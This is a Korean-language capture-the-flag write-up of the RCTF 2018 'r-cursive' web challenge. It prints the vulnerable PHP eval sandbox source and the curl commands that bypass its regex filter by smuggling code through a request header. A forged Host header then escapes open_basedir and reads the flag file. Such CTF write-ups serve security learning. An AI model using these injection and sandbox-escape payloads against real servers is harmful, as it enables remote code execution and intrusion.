# RCTF 2018 Quals 

## Introduce

뭔가 요즘 xctf 플랫폼을 많이 사용하는 것 같다.

## writeup

### - r-recursive

문제에 접속하면 단순히 sandbox를 생성해주는 페이지에 접속한다.~~(폰트가 정말 거지같다.)~~

```html
<?php
$token = sha1($_SERVER['REMOTE_ADDR']);
$dir = '../sandbox/'.$token.'/';
is_dir($dir) ?: mkdir($dir);
is_file($dir.'index.php') ?: file_put_contents($dir.'index.php', str_replace('#SHA1#', $token, file_get_contents('./template')));
switch($_GET['action'] ?: ''){
    case 'go':
        header('Location: http://'.$token.'.sandbox.r-cursive.ml:1337/');
        break;
    case 'reset':
        system('rm -rf '.$dir);
        break;
    default:
        show_source(__FILE__);
}
?>
<style>code{font-family: Segoe Script, Brush Script MT, cursive; font-size: 1.337em;}</style>
```

action=go를 통해 sandbox페이지로 이동해보면 소스코드는 간단하다.

```html
<?php
sha1($_SERVER['REMOTE_ADDR']) === 'c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295' ?: die();
';' === preg_replace('/[^\W_]+\((?R)?\)/', NULL, $_GET['cmd']) ? eval($_GET['cmd']) : show_source(__FILE__);
```

cmd뒤에 명령어를 삽입해주면 되는데, 정규식으로 인해 쿼리는 `phpinfo();`, `print_r(scandir(getcwd()));` 와 같은 형태로 함수로만 넣을 수 있다.

하지만 이 문제는 `open_basedir`이 적용되어 있어, `/var/www/sandbox/c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295/`,`/tmp/` 외의 디렉토리는 사용할 수 없다.

disable_functions, disable_classes를 보기위해 `phpinfo()` 를 실행시켰는데, 다른 것 또한 발견하였다.

```ini
disable_functions = system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,mb_send_mail,assert,dl,set_time_limit,ignore_user_abort,symlink,link	
disable_clsass = GlobIterator,DirectoryIterator,FilesystemIterator,RecursiveDirectoryIterator	
auto_prepend_file = /var/www/sandbox/init.php
open_basedir = /var/www/sandbox/c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295/:/tmp/	
Loaded Modules = ... mod_vhost_alias
```

우선 정규식을 우회하기 위해 `getallheaders()`함수를 사용했다.

```
$ curl "http://c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295.sandbox.r-cursive.ml:1337/?cmd=eval(end(getallheaders()));" -H "a:print_r(readfile('../init.php'));print_r(ini_get('open_basedir'));" 
<br />
<b>Warning</b>:  readfile(): open_basedir restriction in effect. File(../init.php) is not within the allowed path(s): (/var/www/sandbox/c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295/:/tmp/) in <b>/var/www/sandbox/c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295/index.php(3) : eval()'d code(1) : eval()'d code</b> on line <b>1</b><br />
<br />
<b>Warning</b>:  readfile(../init.php): failed to open stream: Operation not permitted in <b>/var/www/sandbox/c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295/index.php(3) : eval()'d code(1) : eval()'d code</b> on line <b>1</b><br />
/var/www/sandbox/c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295/:/tmp/
```

이제 `open_basedir`을 우회하기 위해 header의 host를 `.r-cursive.ml` 로 변경하였고, 이로 인해 sandbox를 탈출하여 init.php를 열었고 플래그를 획득할 수 있었다.

```
$ curl "http://c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295.sandbox.r-cursive.ml:1337/c9bfd6fc4ed10bcd8abd93062b6b643cbcce0295/?cmd=eval(end(getallheaders()));" -H "a:print_r(readfile('../init.php'));print_r(ini_get('open_basedir'));" -vv -H "Host:.r-cursive.ml"

<?php
    ini_set("open_basedir", $_SERVER['DOCUMENT_ROOT']."/:/tmp/");
    // flag: RCTF{apache_mod_vhost_alias_should_be_configured_correctly}
?>
```



FLAG : RCTF{apache_mod_vhost_alias_should_be_configured_correctly}

